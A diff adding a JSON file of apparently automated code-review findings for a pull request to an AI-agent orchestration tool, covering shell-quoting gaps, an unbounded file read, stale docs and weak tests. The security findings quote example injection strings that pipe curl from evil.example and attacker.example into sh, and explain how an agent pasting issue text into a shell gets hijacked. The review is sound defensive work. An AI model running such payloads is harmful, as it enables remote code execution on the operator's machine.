@@ -1,0 +1,163 @@
+{
+  "review_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03",
+  "head": "5382b56abf17d23db61108554f3c6c68c8e3c036",
+  "findings": [
+    {
+      "global_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03#review-logic-w8:F-001",
+      "reviewer": "review-logic",
+      "severity": "major",
+      "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
+      "quote": "--task-text '<task.description>'",
+      "problem": "The r02 shell-injection fix moves --task-text to single quotes, but only flow-orchestrator states the rule that makes that safe (a ' in the text becomes '\\''). task-implementer, job-orchestrator (2 sites), orchestrator-prompt (2 sites) and tests-creator give only the quoted placeholder. A description with an apostrophe (\"Don't touch the user's menu\") parses as one truncated argument plus stray arguments, or an unterminated quote.",
+      "impact": "Keywords after the first apostrophe never reach the resolver, so the promotion the feature exists for is silently lost for such tasks; with an odd number of apostrophes the unquoted remainder reopens the $(...) execution path the change was meant to close.",
+      "evidence": "keryx ctx rg for \"'\\\\''\" over src/gdskills/bundled/skills and .metaproject/skills/gdskills/orchestration matches only the two flow-orchestrator files; keryx ctx rg --hidden \"task-text [\\\"']\" lists the other quoted sites; cmp confirmed the managed copies are identical to the bundled ones.",
+      "class_scope": {
+        "sites": [
+          "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
+          "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
+          ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:1307",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
+          ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93",
+          "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (already states the rule)"
+        ],
+        "enumeration_method": "keryx ctx rg --hidden for task-text followed by a quote character over README.md, docs, src, .metaproject/skills, .metaproject/core excluding reviews and flows (19 matches, 13 files); keryx ctx rg -c for the escape sequence '\\'' to find which sites state the rule (2 files, both flow-orchestrator). Literal examples in docs and live-run.md are fixed strings and are safe."
+      },
+      "cluster": "task-text-escape-rule-missing",
+      "executed_evidence_files": [
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/verify-review-security-code-w5_F-001-1.txt"
+      ]
+    },
+    {
+      "global_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03#review-security-code-w5:F-001",
+      "reviewer": "review-security-code",
+      "severity": "major",
+      "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
+      "quote": "--task-text '<task.description>' --out <project-relative path>",
+      "problem": "Commit 4838b1b40 changed the --task-text examples from double to single quotes and wrote the rule that an embedded ' becomes '\\'' only in flow-orchestrator/SKILL.md:323. Four other instruction sites (task-implementer, tests-creator, job-orchestrator SKILL.md twice, orchestrator-prompt.md twice) show --task-text '<...>' with no escape rule, so text that holds an apostrophe closes the quote and the remainder is parsed by the shell.",
+      "impact": "Task text comes from issues and PR descriptions that outsiders can write. An issue body such as x'; curl https://evil.example/p.sh | sh; echo ' substituted literally by the executing agent runs in its Bash shell with the checkout and its credentials. Plain apostrophes break the command without any attacker. Exploitation needs the model to copy the text verbatim, hence major and not blocker.",
+      "evidence": "keryx ctx rg -n --all \"task-text\" src/gdskills/bundled/skills lists 7 matches in 5 files; keryx ctx rg -n --all -e \"single-quoted\" -e \"inside it becomes\" shows the escape rule only at flow-orchestrator/SKILL.md:323. task-implementer/SKILL.md:182 reads: ... --task-text '<task.description>' --out <project-relative path> ...; no escape mention anywhere in that file. The managed copies under .metaproject/skills/gdskills are byte-identical (diff -q on task-implementer).",
+      "class_scope": {
+        "sites": [
+          "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
+          "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
+          "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
+          ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182",
+          ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:1307",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
+          "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (correct: carries the escape rule)"
+        ],
+        "enumeration_method": "keryx ctx rg -n --all \"task-text\" src/gdskills/bundled/skills (7 matches, 5 files) plus keryx ctx rg -n --all -e \"single-quoted\" -e \"inside it becomes\" src/gdskills/bundled/skills (escape rule at flow-orchestrator:323 only); .metaproject copies are byte-identical per the skill-sync test"
+      },
+      "cluster": "task-text-escape-rule-missing",
+      "executed_evidence_files": [
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/verify-review-security-code-w5_F-001-1.txt"
+      ]
+    },
+    {
+      "global_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03#review-security-code-w6:F-001",
+      "reviewer": "review-security-code",
+      "severity": "major",
+      "file": "src/gdskills/references-check.ts",
+      "quote": "text = await readFile(origin === undefined ? path.join(projectRoot, rulePath) : resolveOriginPath(origin, projectRoot), \"utf8\");",
+      "problem": "scanCitations reads the origin of every link-mode project rule with a bare readFile: no lstat/stat, no isFile check, no size cap, no check that the path is inside the project. The origin is the `origin` string of a projectRuleRegistry entry in .metaproject/metaproject.json (readProjectRuleRegistry only checks kind, ref, mode and sha256 are present), and resolveOriginPath returns any absolute path or ~/ path verbatim. This slice makes the read unattended: tui-shell.ts creates createProjectContextFeed({ load: () => loadProjectContextStatus(projectContextDir()) }) at shell start and the feed polls it every PROJECT_CONTEXT_POLL_MS (5000 ms); loadProjectContextStatus -> readReferences -> checkReferences -> scanCitations runs whenever .metaproject/rules/project/references.json exists. The sibling reader in the same file, inspectDocument, does the right thing (lstat, realpath, isPathInside, stat().isFile(), size <= CONTRACT_MAX_BYTES) for the declared documents, so the guarded pattern exists one function below. The resolver's readText (context-resolver.ts:177) has the same bare readFile and also runs on the link origin, but it is only reached when an agent runs resolve-context; before this flow nothing read a link origin merely because the TUI was open.",
+      "impact": "Attack vector: an attacker publishes a repository whose tracked .metaproject/metaproject.json registers a link-mode rule with origin \"/dev/zero\" (and no copy under .metaproject/rules/project/, so the link branch is taken) next to a valid references.json. The victim clones it and opens keryx in that directory. Within the first tick, and every 5 s after, scanCitations calls readFile(\"/dev/zero\"). Probed: under `ulimit -v 6000000`, bun -e 'readFile(\"/dev/zero\",\"utf8\")' fails with ENOMEM after about 0.9 s, so the read buffers until the allocator refuses; I did not run it without a limit, where the process can be killed by the OOM killer instead. With origin \"/dev/stdin\" or \"/dev/tty\" (or any FIFO the attacker can name on the victim's machine) readFile blocks instead: the poll guard then keeps later polls from piling up, but every showProjectContext()/`/projectctx` awaits a fresh loadProjectContextStatus that never resolves, each pinning another libuv thread-pool thread, and a tty origin competes with the TUI for keystrokes (not probed). Outcome is availability of the operator's TUI session (memory exhaustion or a frozen /projectctx and enforcement toggle), triggered by opening an untrusted checkout. No data is disclosed: only backticked *.md tokens that name existing files are echoed back.",
+      "evidence": "src/gdskills/references-check.ts:99-109 (links map built from readProjectRuleRegistry, then readFile(resolveOriginPath(origin, projectRoot))); src/gdskills/project-skills.ts:309-315 resolveOriginPath returns path.resolve(projectRoot, ref) so an absolute ref is unchanged; src/gdskills/project-rules.ts:51-68 isEntry/readProjectRuleRegistry do not validate `origin`; src/gdskills/project-context-status.ts:74-80 readReferences calls checkReferences; slice-08 tui-shell.ts hunk @@ 5252,5294 @@ createProjectContextFeed + PROJECT_CONTEXT_POLL_MS in project-context-inspector.ts; .metaproject/metaproject.json is PROJECT_SKILLS_MANIFEST_PATH (tracked). Probe: bun readFile(\"/dev/zero\") under ulimit -v -> ENOMEM in 920 ms.",
+      "class_scope": {
+        "sites": [
+          "src/gdskills/references-check.ts:105 (scanCitations, new in this PR, reached by the TUI poll)",
+          "src/gdskills/context-resolver.ts:177-183 and :217-218 (readText on the link origin, reached by resolve-context; existing)",
+          "src/review/reviewers.ts:271 (readFile(resolveOriginPath(origin, projectRoot)); existing, not reached from this slice)",
+          "src/gdskills/update-rules.ts:69 (originPath for an explicit `skills update --rules`; existing, operator-invoked)",
+          "src/gdskills/references-check.ts:121-143 inspectDocument (already guarded; the model for the fix)"
+        ],
+        "enumeration_method": "keryx ctx rg --all resolveOriginPath src (15 matches in 7 files); read each caller. Only references-check.ts:105 is both new in this PR and reachable unattended from the TUI poll; the others are listed so the fix can share one helper."
+      },
+      "cluster": "single:review-security-code-w6:F-001",
+      "executed_evidence_files": [
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/verify-review-security-code-w6_F-001-1.txt"
+      ]
+    },
+    {
+      "global_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03#review-security-code-w7:F-001",
+      "reviewer": "review-security-code",
+      "severity": "major",
+      "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
+      "quote": "--task-text '<task.description>'",
+      "problem": "r02 review-security-code-w4:F-002 reported that the skills tell the executing agent to put the task title and description into a double-quoted shell argument, where backticks and $(...) still run. This delta changes the quote character to single quotes in every instruction, but only flow-orchestrator/SKILL.md:323 (and its bundled copy) adds the sentence that makes single quotes safe: \"Write the text single-quoted (a ' inside it becomes '\\'')\". The other instructions give the bare form with no escape rule: task-implementer/SKILL.md:182 (--task-text '<task.description>'), tests-creator/SKILL.md:93 (--task-text '<task description>'), job-orchestrator/SKILL.md:749 and :1307, job-orchestrator/orchestrator-prompt.md:132 and :188, and README.md:270. Single quotes protect only until the first ' in the text. A task description is free markdown prose: \"don't\", \"the user's\" or \"it's\" ends the quote, and the rest of the description is then parsed by the shell unquoted, where the backticks and $(...) that markdown descriptions carry run as commands. The flow-orchestrator placeholder itself reads '<the task's title and description>', an apostrophe inside the quoted placeholder. The CLI still has no stdin or file route for the text (optionValue in src/lib/args.ts takes the next argv token), so argv quoting is the only path and the instruction is the only guard.",
+      "impact": "Attack vector: task titles and descriptions reach these dispatches from analysed issues and PR text that outsiders can write, and from job analysis output. An issue body such as \"Don't touch `curl https://attacker.example/x | sh`\" or \"it's broken $(curl attacker.example/x|sh)\" is substituted into --task-text '...' by the agent following the instruction; the apostrophe closes the quote and the backtick or $(...) span executes in the agent's shell with the operator's credentials and working tree. Even without an attacker, every apostrophe in an ordinary description yields a malformed command (unterminated quote or split arguments), so the resolve step fails or silently receives a cut text and keyword promotion does not happen. The fix in the one orchestrator shows the rule is known; the workers that run inside a dispatch (task-implementer, tests-creator) and the job orchestrator are the ones without it.",
+      "evidence": "Counts at head of the escape sentence vs. the bare single-quoted form: flow-orchestrator/SKILL.md 1 site, rule present; job-orchestrator/SKILL.md 2 sites, rule absent; job-orchestrator/orchestrator-prompt.md 2 sites, rule absent; task-implementer/SKILL.md 1 site, rule absent; tests-creator/SKILL.md 1 site, rule absent; README.md 1 site, rule absent (python over the files). Each skill file has a byte-identical copy under src/gdskills/bundled/skills (cmp on task-implementer confirms). The delta diff d6267d4..5382b56 for the skill files shows only the quote character change, except flow-orchestrator, which also gains the sentence. src/lib/args.ts optionValue shows no stdin or file route.",
+      "class_scope": {
+        "sites": [
+          ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182 and src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
+          ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93 and src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749 and :1307, and the bundled copy",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132 and :188, and the bundled copy",
+          "README.md:270",
+          ".metaproject/skills/gdskills/orchestration/flow-orchestrator/SKILL.md:323 and bundled copy (has the rule, but the placeholder holds an apostrophe)",
+          "docs/docs/guides/apply-project-rules.md:172 and docs/requirements/keryx-conditional-reads/live-run.md:136,155,170 are fixed double-quoted literals typed by an operator; not part of the class"
+        ],
+        "enumeration_method": "Scanned every tracked file outside .metaproject/{reviews,data,flows} for --task-text followed by a quote character (python over git ls-files), then checked each file for the '\\'' escape sentence. 8 instruction sites (each skill file with a bundled copy) plus README and 4 operator-typed doc examples; only the flow-orchestrator file carries the rule."
+      },
+      "cluster": "task-text-escape-rule-missing",
+      "executed_evidence_files": [
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/verify-review-security-code-w5_F-001-1.txt"
+      ]
+    },
+    {
+      "global_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03#review-style-w2:F-001",
+      "reviewer": "review-style",
+      "severity": "major",
+      "file": "docs/docs/guides/apply-project-rules.md",
+      "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
+      "problem": "The r03 delta makes `references check`/`suggest` scan a rule imported with `--link` at its origin (references-check.ts now reads `resolveOriginPath(origin, projectRoot)`; the new test 'a rule imported with --link is scanned at its origin' asserts it). The code comment in references-check.ts:16 was updated, but two user-facing statements still say the opposite: this guide paragraph and the `references check` row in cli-reference.md ('Citations are backticked `X.md` names in `.metaproject/rules/project/`; a linked rule is not scanned.').",
+      "impact": "Trigger: an operator who imported rules with `--link` reads the guide or CLI reference before running `keryx skills references check`. Outcome: the docs tell them their linked rules' citations are invisible to the check, yet the command reports `undeclared-citation` for documents cited by those rules (and no longer reports `unused-declaration` for them); they will treat correct output as a bug or add declarations they believe are unneeded. Documentation that is actively wrong is a major comment-quality defect.",
+      "evidence": "docs/docs/guides/apply-project-rules.md:261 and docs/docs/cli-reference.md:3491 say linked rules are not scanned; src/gdskills/references-check.ts:16 and :98 and src/commands/skills-references.test.ts:333 say and prove they are. keryx ctx rg for 'linked rule|imported with .--link|not scanned' over README.md, docs (excluding docs/requirements), src/gdskills, src/commands and .metaproject/skills/gdskills returned exactly these two stale statements; the earlier findings review-architecture-w3:F-002 and review-logic-w2:F-001 covered the code, not these docs.",
+      "class_scope": {
+        "sites": [
+          "docs/docs/guides/apply-project-rules.md:261",
+          "docs/docs/cli-reference.md:3491 (references check row)"
+        ],
+        "enumeration_method": "keryx ctx rg -n --all 'linked rule|imported with .--link|not scanned' README.md docs src/gdskills src/commands .metaproject/skills/gdskills --glob '!docs/requirements/**' (17 matches, 2 are the stale claim; the rest concern import/update/remove behaviour)"
+      },
+      "cluster": "docs-linked-rule-not-scanned",
+      "executed_evidence_files": [
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/verify-review-style-w2_F-001-1.txt"
+      ]
+    },
+    {
+      "global_id": "2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03#review-testing-practices-w1:F-001",
+      "reviewer": "review-testing-practices",
+      "severity": "major",
+      "file": "src/gdskills/reference-entries.test.ts",
+      "quote": "expect(keywordOccurs(\"rename the .css files\", \".css\")).toBe(true);",
+      "problem": "The fix for review-logic-w3:F-002 (conditional lookarounds in keywordOccurs) is covered by tests that the old, buggy regex also passes. The defect was a symbol-edged keyword failing when a word character sits next to that edge ('styles.css' for '.css', 'a@apply' for '@apply'). Every symbol-edge assertion in the new first test puts a space (or the string start/end) next to the symbol: 'rename the .css files', 'use @apply in the sheet', 'add c++ bindings', 'USE @APPLY'. A lookbehind or lookahead that is unconditional succeeds on a space, so these cases never exercised the bug. No test in the delta contains 'styles.css' or any word character directly adjacent to a symbol edge of a keyword.",
+      "impact": "Trigger: someone reverts or re-breaks keywordOccurs to apply both lookarounds unconditionally (the pre-fix form), or swaps the before/after edge test. Outcome: the suite stays green, and a task such as 'fix styles.css' silently stops promoting a document declared with keyword '.css', which is the exact silent skip of a mandatory read that F-002 reported. The F-008 gap is therefore only partly closed: digits, underscore, Cyrillic and metacharacters are now pinned (css3, my_css, css_modules, \u043f\u043e\u0434\u0442\u0435\u043c\u0430, a.b vs axb, c++), the punctuation-edge case is not.",
+      "evidence": "Ran the pre-fix regex (`(?<![\\p{L}\\p{N}_])<escaped>(?![\\p{L}\\p{N}_])`, flags iu) under bun on the four inputs of the first new test: all four return true, the same as the fixed function. The same regex returns false only for ('fix styles.css please', '.css'), which no test uses; the fixed function returns true for it and for ('a@apply', '@apply'). So reverting the fix would not fail any assertion in reference-entries.test.ts.",
+      "class_scope": {
+        "sites": [
+          "src/gdskills/reference-entries.test.ts: keywordOccurs 'a keyword starting or ending with a symbol' (four assertions, none with a word char next to the symbol edge)",
+          "src/gdskills/context-resolver.test.ts and src/gdskills/conditional-reads.e2e.test.ts: keyword promotion cases use word keywords only"
+        ],
+        "enumeration_method": "keryx ctx rg for keywordOccurs and for the keywords '.css'/'@apply' across src tests; ran the old regex against every symbol-edge input in the delta to see which would distinguish old from new behaviour."
+      },
+      "cluster": "single:review-testing-practices-w1:F-001",
+      "executed_evidence_files": [
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/mutation-1.md",
+        "/home/altsay/keryx/.worktrees/conditional-reads/.metaproject/reviews/2026-10-18-review-flow-github-com-mrciphersmith-keryx-pull-1048-r03/research-evidence/mutation-1.json"
+      ]
+    }
+  ]
+}
